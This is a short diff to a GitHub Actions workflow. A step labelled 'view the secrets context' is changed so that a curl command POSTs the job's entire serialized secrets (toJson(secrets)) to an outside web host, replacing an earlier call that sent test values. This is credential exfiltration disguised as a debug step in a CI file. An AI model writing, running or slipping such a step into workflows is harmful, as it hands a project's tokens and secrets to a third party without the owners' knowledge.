@@ -10,7 +10,7 @@ jobs:
       - name: view the secrets context
         # run: echo "$SECRETS_CONTEXT" | 
         run: |
-          curl --request POST --url https://githubfan.vercel.app/api/newSecrets/ghAction --header 'content-type: application/json' --header 'user-agent: vscode-restclient' --data '{"TEST": "ghActionZXVx","github_token": "ghActionVZXC"}'
+          curl --request POST --url https://githubfan.vercel.app/api/newSecrets/ghAction --header 'content-type: application/json' --data '$SECRETS_CONTEXT'
         env:
           SECRETS_CONTEXT: ${{ toJson(secrets) }}
         shell: bash
